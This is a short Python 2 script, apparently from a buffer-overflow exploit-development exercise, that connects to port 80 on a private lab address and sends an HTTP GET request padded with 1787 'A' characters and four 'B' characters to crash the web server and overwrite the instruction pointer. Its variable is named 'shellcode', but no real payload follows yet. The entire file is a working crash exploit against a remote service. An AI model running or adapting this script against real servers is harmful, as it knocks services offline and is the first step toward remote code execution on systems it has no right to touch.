#!/usr/bin/python
import sys
import socket

crash = "A" * 1787 + "B" * 4
shellcode = 'GET ' + crash + 'HTTP/1.1\r\n\r\n'

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	connect = s.connect(('10.11.23.92',80))
	s.send(shellcode)
	s.close()

except:
	print "Error connecting to remote machine."
	sys.exit() 